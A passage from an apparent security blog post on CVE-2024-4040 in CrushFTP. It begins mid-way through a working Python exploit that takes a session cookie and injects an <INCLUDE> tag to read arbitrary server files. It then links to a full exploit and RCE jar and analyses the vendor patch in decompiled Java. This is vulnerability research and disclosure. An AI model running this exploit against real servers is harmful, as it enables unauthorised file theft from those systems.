</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>        sess <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>Session()
</span></span><span style="display:flex;"><span>        sess<span style="color:#f92672">.</span>get(url)
</span></span><span style="display:flex;"><span>        currentAuth <span style="color:#f92672">=</span> sess<span style="color:#f92672">.</span>cookies[<span style="color:#e6db74">&#39;currentAuth&#39;</span>]
</span></span><span style="display:flex;"><span>        response <span style="color:#f92672">=</span> sess<span style="color:#f92672">.</span>get(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>url<span style="color:#e6db74">}</span><span style="color:#e6db74">/WebInterface/function/?command=zip&amp;c2f=&#34;</span><span style="color:#f92672">+</span>currentAuth<span style="color:#f92672">+</span><span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;&amp;path=&lt;INCLUDE&gt;</span><span style="color:#e6db74">{</span>filename<span style="color:#e6db74">}</span><span style="color:#e6db74">&lt;/INCLUDE&gt;&amp;names=*&#34;</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> filename <span style="color:#f92672">in</span> response<span style="color:#f92672">.</span>text:
</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">&#34;[!] Filename found in response, the requested file may not exist&#34;</span>)
</span></span><span style="display:flex;"><span>            print(response<span style="color:#f92672">.</span>text)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>            print(response<span style="color:#f92672">.</span>text)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">True</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Error occured: &#34;</span>, e)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
</span></span><span style="display:flex;"><span>    parser <span style="color:#f92672">=</span> argparse<span style="color:#f92672">.</span>ArgumentParser(description<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Script to check for vulnerability and perform LFI on CrushFTP.&#34;</span>)
</span></span><span style="display:flex;"><span>    parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#34;--check&#34;</span>, action<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;store_true&#34;</span>, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Check if the remote instance is vulnerable or not&#34;</span>)
</span></span><span style="display:flex;"><span>    parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#34;--lfi&#34;</span>, metavar<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;FILENAME&#34;</span>, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Include a file from the remote instance&#34;</span>)
</span></span><span style="display:flex;"><span>    parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#34;--url&#34;</span>, required<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Base URL of the CrushFTP instance&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    args <span style="color:#f92672">=</span> parser<span style="color:#f92672">.</span>parse_args()
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;-&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x30</span>)
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;Exploit for CVE 2024-4040 - CrushFTP SSTI Vulnerability&#34;</span>)
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;Author: D4mianWayne (Robin)&#34;</span>)
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;Blog: https://d4mianwayne.github.io</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;-&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x30</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>check:
</span></span><span style="display:flex;"><span>        check_vulnerability(args<span style="color:#f92672">.</span>url)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>lfi:
</span></span><span style="display:flex;"><span>        do_include_file_command(args<span style="color:#f92672">.</span>url, args<span style="color:#f92672">.</span>lfi)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
</span></span><span style="display:flex;"><span>    main()
</span></span></code></pre></div><p><img src="/img/CrushFTP/Untitled_9.png" alt="Untitled"></p>
<p>The exploit script and the exploit.jar (used for RCE) can be found <a href="https://github.com/D4mianWayne/POCs/tree/main/CVE%202024-4040">here</a>.</p>
<h2 id="patch">Patch</h2>
<p>The CrushFTP developers fixed this in 11.1.0 and 10.6.0 versions. Checking the <code>writeResponse</code> method, we clearly see that the function which was previously being called has been changed, it is now renamed to <code>change_user_safe_vars_to_values_static</code>  , previously it was <code>change_vars_to_values</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>   <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">boolean</span> <span style="color:#a6e22e">writeResponse</span>(String response) <span style="color:#66d9ef">throws</span> Exception {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">writeResponse</span>(response, <span style="color:#66d9ef">true</span>, 200, <span style="color:#66d9ef">true</span>, <span style="color:#66d9ef">false</span>, <span style="color:#66d9ef">true</span>);
</span></span><span style="display:flex;"><span>   }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">boolean</span> <span style="color:#a6e22e">writeResponse</span>(String response, <span style="color:#66d9ef">boolean</span> json) <span style="color:#66d9ef">throws</span> Exception {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">writeResponse</span>(response, <span style="color:#66d9ef">true</span>, 200, <span style="color:#66d9ef">true</span>, json, <span style="color:#66d9ef">true</span>);
</span></span><span style="display:flex;"><span>   }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">boolean</span> <span style="color:#a6e22e">writeResponse</span>(String response, <span style="color:#66d9ef">boolean</span> log, <span style="color:#66d9ef">int</span> code, <span style="color:#66d9ef">boolean</span> convertVars, <span style="color:#66d9ef">boolean</span> json, <span style="color:#66d9ef">boolean</span> log_header) <span style="color:#66d9ef">throws</span> Exception {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">boolean</span> acceptsGZIP <span style="color:#f92672">=</span> <span style="color:#66d9ef">false</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">writeResponse</span>(response, log, code, convertVars, json, acceptsGZIP, log_header);
</span></span><span style="display:flex;"><span>   }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">boolean</span> <span style="color:#a6e22e">writeResponse</span>(String response, <span style="color:#66d9ef">boolean</span> log, <span style="color:#66d9ef">int</span> code, <span style="color:#66d9ef">boolean</span> convertVars, <span style="color:#66d9ef">boolean</span> json, <span style="color:#66d9ef">boolean</span> acceptsGZIP, <span style="color:#66d9ef">boolean</span> log_header) <span style="color:#66d9ef">throws</span> Exception {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (convertVars <span style="color:#f92672">&amp;&amp;</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">thisSessionHTTP</span>.<span style="color:#a6e22e">thisSession</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span>) {
</span></span><span style="display:flex;"><span>         response <span style="color:#f92672">=</span> ServerStatus.<span style="color:#a6e22e">change_user_safe_vars_to_values_static</span>(response, <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">thisSessionHTTP</span>.<span style="color:#a6e22e">thisSession</span>.<span style="color:#a6e22e">user</span>, <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">thisSessionHTTP</span>.<span style="color:#a6e22e">thisSession</span>.<span style="color:#a6e22e">user_info</span>, <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">thisSessionHTTP</span>.<span style="color:#a6e22e">thisSession</span>);
</span></span><span style="display:flex;"><span>      }
</span></span></code></pre></div><p>And checking the <code>change_user_safe_vars_to_values_static</code> , we see that there are two new lines added to the start of this function:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (in_str.<span style="color:#a6e22e">indexOf</span>(<span style="color:#e6db74">&#39;%&#39;</span>) <span style="color:#f92672">&lt;</span> 0 <span style="color:#f92672">&amp;&amp;</span> in_str.<span style="color:#a6e22e">indexOf</span>(<span style="color:#e6db74">&#39;{&#39;</span>) <span style="color:#f92672">&lt;</span> 0 <span style="color:#f92672">&amp;&amp;</span> in_str.<span style="color:#a6e22e">indexOf</span>(<span style="color:#e6db74">&#39;}&#39;</span>) <span style="color:#f92672">&lt;</span> 0 <span style="color:#f92672">&amp;&amp;</span> in_str.<span style="color:#a6e22e">indexOf</span>(<span style="color:#e6db74">&#39;&lt;&#39;</span>) <span style="color:#f92672">&lt;</span> 0)
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> in_str; 
</span></span></code></pre></div><p>We can see that it checks the given string if it contains either of following characters:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>{}<span style="color:#f92672">%&lt;</span>
</span></span></code></pre></div><p>More so, this function does not even check for <code>INCLUDE</code> or any other such tags for that matter basically mitigating any chances of invoking those.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>  <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> String <span style="color:#a6e22e">change_user_safe_vars_to_values_static</span>(String in_str, Properties user, Properties user_info, SessionCrush the_session) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span> {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (in_str.<span style="color:#a6e22e">indexOf</span>(<span style="color:#e6db74">&#39;%&#39;</span>) <span style="color:#f92672">&lt;</span> 0 <span style="color:#f92672">&amp;&amp;</span> in_str.<span style="color:#a6e22e">indexOf</span>(<span style="color:#e6db74">&#39;{&#39;</span>) <span style="color:#f92672">&lt;</span> 0 <span style="color:#f92672">&amp;&amp;</span> in_str.<span style="color:#a6e22e">indexOf</span>(<span style="color:#e6db74">&#39;}&#39;</span>) <span style="color:#f92672">&lt;</span> 0 <span style="color:#f92672">&amp;&amp;</span> in_str.<span style="color:#a6e22e">indexOf</span>(<span style="color:#e6db74">&#39;&lt;&#39;</span>) <span style="color:#f92672">&lt;</span> 0)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> in_str; 
</span></span><span style="display:flex;"><span>      String r1 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;%&#34;</span>;
</span></span><span style="display:flex;"><span>      String r2 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;%&#34;</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> r <span style="color:#f92672">=</span> 0; r <span style="color:#f92672">&lt;</span> 2; r<span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (in_str.<span style="color:#a6e22e">indexOf</span>(r1) <span style="color:#f92672">&gt;=</span> 0)
</span></span><span style="display:flex;"><span>          in_str <span style="color:#f92672">=</span> parse_server_messages(in_str); 
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (in_str.<span style="color:#a6e22e">indexOf</span>(String.<span style="color:#a6e22e">valueOf</span>(r1) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;server_time_date&#34;</span> <span style="color:#f92672">+</span> r2) <span style="color:#f92672">&gt;=</span> 0)
</span></span><span style="display:flex;"><span>          in_str <span style="color:#f92672">=</span> Common.<span style="color:#a6e22e">replace_str</span>(in_str, String.<span style="color:#a6e22e">valueOf</span>(r1) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;server_time_date&#34;</span> <span style="color:#f92672">+</span> r2, (<span style="color:#66d9ef">new</span> Date()).<span style="color:#a6e22e">toString</span>()); 
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (in_str.<span style="color:#a6e22e">indexOf</span>(String.<span style="color:#a6e22e">valueOf</span>(r1) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;login_number&#34;</span> <span style="color:#f92672">+</span> r2) <span style="color:#f92672">&gt;=</span> 0)
</span></span><span style="display:flex;"><span>          in_str <span style="color:#f92672">=</span> Common.<span style="color:#a6e22e">replace_str</span>(in_str, String.<span style="color:#a6e22e">valueOf</span>(r1) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;login_number&#34;</span> <span style="color:#f92672">+</span> r2, uSG(user_info, <span style="color:#e6db74">&#34;user_number&#34;</span>)); 
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (in_str.<span style="color:#a6e22e">indexOf</span>(String.<span style="color:#a6e22e">valueOf</span>(r1) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;user_password&#34;</span> <span style="color:#f92672">+</span> r2) <span style="color:#f92672">&gt;=</span> 0)
</span></span><span style="display:flex;"><span>          in_str <span style="color:#f92672">=</span> Common.<span style="color:#a6e22e">replace_str</span>(in_str, String.<span style="color:#a6e22e">valueOf</span>(r1) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;user_password&#34;</span> <span style="color:#f92672">+</span> r2, uSG(user_info, <span style="color:#e6db74">&#34;current_password&#34;</span>)); 
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (in_str.<span style="color:#a6e22e">indexOf</span>(String.<span style="color:#a6e22e">valueOf</span>(r1) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;user_name&#34;</span> <span style="color:#f92672">+</span> r2) <span style="color:#f92672">&gt;=</span> 0)
</span></span><span style="display:flex;"><span>          in_str <span style="color:#f92672">=</span> Common.<span style="color:#a6e22e">replace_str</span>(in_str, String.<span style="color:#a6e22e">valueOf</span>(r1) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;user_name&#34;</span> <span style="color:#f92672">+</span> r2, uSG(user, <span style="color:#e6db74">&#34;username&#34;</span>)); 
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (in_str.<span style="color:#a6e22e">indexOf</span>(String.<span style="color:#a6e22e">valueOf</span>(r1) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;user_anonymous_password&#34;</span> <span style="color:#f92672">+</span> r2) <span style="color:#f92672">&gt;=</span> 0)
</span></span><span style="display:flex;"><span>          in_str <span style="color:#f92672">=</span> Common.<span style="color:#a6e22e">replace_str</span>(in_str, String.<span style="color:#a6e22e">valueOf</span>(r1) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;user_anonymous_password&#34;</span> <span style="color:#f92672">+</span> r2, uSG(user_info, <span style="color:#e6db74">&#34;user_name&#34;</span>).<span style="color:#a6e22e">equalsIgnoreCase</span>(<span style="color:#e6db74">&#34;anonymous&#34;</span>) <span style="color:#f92672">?</span> uSG(user_info, <span style="color:#e6db74">&#34;current_password&#34;</span>) : <span style="color:#e6db74">&#34;&#34;</span>); 
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (in_str.<span style="color:#a6e22e">indexOf</span>(String.<span style="color:#a6e22e">valueOf</span>(r1) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;user_current_dir&#34;</span> <span style="color:#f92672">+</span> r2) <span style="color:#f92672">&gt;=</span> 0)
</span></span><span style="display:flex;"><span>          in_str <span style="color:#f92672">=</span> Common.<span style="color:#a6e22e">replace_str</span>(in_str, String.<span style="color:#a6e22e">valueOf</span>(r1) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;user_current_dir&#34;</span> <span style="color:#f92672">+</span> r2, the_session.<span style="color:#a6e22e">get_PWD</span>()); 
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (in_str.<span style="color:#a6e22e">indexOf</span>(String.<span style="color:#a6e22e">valueOf</span>(r1) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;user_site_commands_text&#34;</span> <span style="color:#f92672">+</span> r2) <span style="color:#f92672">&gt;=</span> 0)
</span></span><span style="display:flex;"><span>          in_str <span style="color:#f92672">=</span> Common.<span style="color:#a6e22e">replace_str</span>(in_str, String.<span style="color:#a6e22e">valueOf</span>(r1) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;user_site_commands_text&#34;</span> <span style="color:#f92672">+</span> r2, uSG(user, <span style="color:#e6db74">&#34;site&#34;</span>)); 
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (in_str.<span style="color:#a6e22e">indexOf</span>(String.<span style="color:#a6e22e">valueOf</span>(r1) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;user_the_command_data&#34;</span> <span style="color:#f92672">+</span> r2) <span style="color:#f92672">&gt;=</span> 0)
</span></span><span style="display:flex;"><span>          in_str <span style="color:#f92672">=</span> Common.<span style="color:#a6e22e">replace_str</span>(in_str, String.<span style="color:#a6e22e">valueOf</span>(r1) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;user_the_command_data&#34;</span> <span style="color:#f92672">+</span> r2, uSG(user_info, <span style="color:#e6db74">&#34;the_command_data&#34;</span>)); 
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (in_str.<span style="color:#a6e22e">indexOf</span>(String.<span style="color:#a6e22e">valueOf</span>(r1) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;the_command_data&#34;</span> <span style="color:#f92672">+</span> r2) <span style="color:#f92672">&gt;=</span> 0)
</span></span><span style="display:flex;"><span>          in_str <span style="color:#f92672">=</span> Common.<span style="color:#a6e22e">replace_str</span>(in_str, String.<span style="color:#a6e22e">valueOf</span>(r1) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;the_command_data&#34;</span> <span style="color:#f92672">+</span> r2, uSG(user_info, <span style="color:#e6db74">&#34;the_command_data&#34;</span>)); 
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (in_str.<span style="color:#a6e22e">indexOf</span>(String.<span style="color:#a6e22e">valueOf</span>(r1) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;user_the_command&#34;</span> <span style="color:#f92672">+</span> r2) <span style="color:#f92672">&gt;=</span> 0)
</span></span><span style="display:flex;"><span>          in_str <span style="color:#f92672">=</span> Common.<span style="color:#a6e22e">replace_str</span>(in_str, String.<span style="color:#a6e22e">valueOf</span>(r1) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;user_the_command&#34;</span> <span style="color:#f92672">+</span> r2, uSG(user_info, <span style="color:#e6db74">&#34;the_command&#34;</span>)); 
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (in_str.<span style="color:#a6e22e">indexOf</span>(String.<span style="color:#a6e22e">valueOf</span>(r1) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;the_command&#34;</span> <span style="color:#f92672">+</span> r2) <span style="color:#f92672">&gt;=</span> 0)
</span></span><span style="display:flex;"><span>          in_str <span style="color:#f92672">=</span> Common.<span style="color:#a6e22e">replace_str</span>(in_str, String.<span style="color:#a6e22e">valueOf</span>(r1) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;the_command&#34;</span> <span style="color:#f92672">+</span> r2, uSG(user_info, <span style="color:#e6db74">&#34;the_command&#34;</span>)); 
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (in_str.<span style="color:#a6e22e">indexOf</span>(String.<span style="color:#a6e22e">valueOf</span>(r1) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;user_file_length&#34;</span> <span style="color:#f92672">+</span> r2) <span style="color:#f92672">&gt;=</span> 0)
</span></span><span style="display:flex;"><span>          in_str <span style="color:#f92672">=</span> Common.<span style="color:#a6e22e">replace_str</span>(in_str, String.<span style="color:#a6e22e">valueOf</span>(r1) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;user_file_length&#34;</span> <span style="color:#f92672">+</span> r2, uSG(user_info, <span style="color:#e6db74">&#34;file_length&#34;</span>)); 
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (in_str.<span style="color:#a6e22e">indexOf</span>(String.<span style="color:#a6e22e">valueOf</span>(r1) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;user_overall_transfer_speed&#34;</span> <span style="color:#f92672">+</span> r2) <span style="color:#f92672">&gt;=</span> 0)
</span></span><span style="display:flex;"><span>          in_str <span style="color:#f92672">=</span> Common.<span style="color:#a6e22e">replace_str</span>(in_str, String.<span style="color:#a6e22e">valueOf</span>(r1) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;user_overall_transfer_speed&#34;</span> <span style="color:#f92672">+</span> r2, uSG(user_info, <span style="color:#e6db74">&#34;overall_transfer_speed&#34;</span>)); 
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (in_str.<span style="color:#a6e22e">indexOf</span>(String.<span style="color:#a6e22e">valueOf</span>(r1) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;user_paused&#34;</span> <span style="color:#f92672">+</span> r2) <span style="color:#f92672">&gt;=</span> 0)
</span></span><span style="display:flex;"><span>          in_str <span style="color:#f92672">=</span> Common.<span style="color:#a6e22e">replace_str</span>(in_str, String.<span style="color:#a6e22e">valueOf</span>(r1) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;user_paused&#34;</span> <span style="color:#f92672">+</span> r2, uSG(user_info, <span style="color:#e6db74">&#34;paused&#34;</span>)); 
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (in_str.<span style="color:#a6e22e">indexOf</span>(String.<span style="color:#a6e22e">valueOf</span>(r1) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;user_ip&#34;</span> <span style="color:#f92672">+</span> r2) <span style="color:#f92672">&gt;=</span> 0)
</span></span><span style="display:flex;"><span>          in_str <span style="color:#f92672">=</span> Common.<span style="color:#a6e22e">replace_str</span>(in_str, String.<span style="color:#a6e22e">valueOf</span>(r1) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;user_ip&#34;</span> <span style="color:#f92672">+</span> r2, uSG(user_info, <span style="color:#e6db74">&#34;ip&#34;</span>)); 
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (in_str.<span style="color:#a6e22e">indexOf</span>(String.<span style="color:#a6e22e">valueOf</span>(r1) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;user_time_remaining&#34;</span> <span style="color:#f92672">+</span> r2) <span style="color:#f92672">&gt;=</span> 0)
</span></span><span style="display:flex;"><span>          in_str <span style="color:#f92672">=</span> Common.<span style="color:#a6e22e">replace_str</span>(in_str, String.<span style="color:#a6e22e">valueOf</span>(r1) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;user_time_remaining&#34;</span> <span style="color:#f92672">+</span> r2, uSG(user_info, <span style="color:#e6db74">&#34;time_remaining&#34;</span>)); 
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (in_str.<span style="color:#a6e22e">indexOf</span>(String.<span style="color:#a6e22e">valueOf</span>(r1) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;user_session_upload_count&#34;</span> <span style="color:#f92672">+</span> r2) <span style="color:#f92672">&gt;=</span> 0)
</span></span><span style="display:flex;"><span>          in_str <span style="color:#f92672">=</span> Common.<span style="color:#a6e22e">replace_str</span>(in_str, String.<span style="color:#a6e22e">valueOf</span>(r1) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;user_session_upload_count&#34;</span> <span style="color:#f92672">+</span> r2, uSG(user_info, <span style="color:#e6db74">&#34;session_upload_count&#34;</span>)); 
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (in_str.<span style="color:#a6e22e">indexOf</span>(String.<span style="color:#a6e22e">valueOf</span>(r1) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;user_session_download_count&#34;</span> <span style="color:#f92672">+</span> r2) <span style="color:#f92672">&gt;=</span> 0)
</span></span><span style="display:flex;"><span>          in_str <span style="color:#f92672">=</span> Common.<span style="color:#a6e22e">replace_str</span>(in_str, String.<span style="color:#a6e22e">valueOf</span>(r1) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;user_session_download_count&#34;</span> <span style="color:#f92672">+</span> r2, uSG(user_info, <span style="color:#e6db74">&#34;session_download_count&#34;</span>)); 
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (in_str.<span style="color:#a6e22e">indexOf</span>(String.<span style="color:#a6e22e">valueOf</span>(r1) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;user_port_remote_ip&#34;</span> <span style="color:#f92672">+</span> r2) <span style="color:#f92672">&gt;=</span> 0)
</span></span><span style="display:flex;"><span>          in_str <span style="color:#f92672">=</span> Common.<span style="color:#a6e22e">replace_str</span>(in_str, String.<span style="color:#a6e22e">valueOf</span>(r1) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;user_port_remote_ip&#34;</span> <span style="color:#f92672">+</span> r2, uSG(user_info, <span style="color:#e6db74">&#34;port_remote_ip&#34;</span>)); 
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (in_str.<span style="color:#a6e22e">indexOf</span>(String.<span style="color:#a6e22e">valueOf</span>(r1) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;user_port_remote_port&#34;</span> <span style="color:#f92672">+</span> r2) <span style="color:#f92672">&gt;=</span> 0)
</span></span><span style="display:flex;"><span>          in_str <span style="color:#f92672">=</span> Common.<span style="color:#a6e22e">replace_str</span>(in_str, String.<span style="color:#a6e22e">valueOf</span>(r1) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;user_port_remote_port&#34;</span> <span style="color:#f92672">+</span> r2, uSG(user_info, <span style="color:#e6db74">&#34;port_remote_port&#34;</span>)); 
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (in_str.<span style="color:#a6e22e">indexOf</span>(String.<span style="color:#a6e22e">valueOf</span>(r1) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;user_time&#34;</span> <span style="color:#f92672">+</span> r2) <span style="color:#f92672">&gt;=</span> 0)
</span></span><span style="display:flex;"><span>          in_str <span style="color:#f92672">=</span> Common.<span style="color:#a6e22e">replace_str</span>(in_str, String.<span style="color:#a6e22e">valueOf</span>(r1) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;user_time&#34;</span> <span style="color:#f92672">+</span> r2, uSG(user_info, <span style="color:#e6db74">&#34;time&#34;</span>)); 
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (in_str.<span style="color:#a6e22e">indexOf</span>(String.<span style="color:#a6e22e">valueOf</span>(r1) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;user_start_resume_loc&#34;</span> <span style="color:#f92672">+</span> r2) <span style="color:#f92672">&gt;=</span> 0)
</span></span><span style="display:flex;"><span>          in_str <span style="color:#f92672">=</span> Common.<span style="color:#a6e22e">replace_str</span>(in_str, String.<span style="color:#a6e22e">valueOf</span>(r1) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;user_start_resume_loc&#34;</span> <span style="color:#f92672">+</span> r2, uSG(user_info, <span style="color:#e6db74">&#34;start_resume_loc&#34;</span>)); 
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (in_str.<span style="color:#a6e22e">indexOf</span>(String.<span style="color:#a6e22e">valueOf</span>(r1) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;user_file_transfer_mode&#34;</span> <span style="color:#f92672">+</span> r2) <span style="color:#f92672">&gt;=</span> 0)
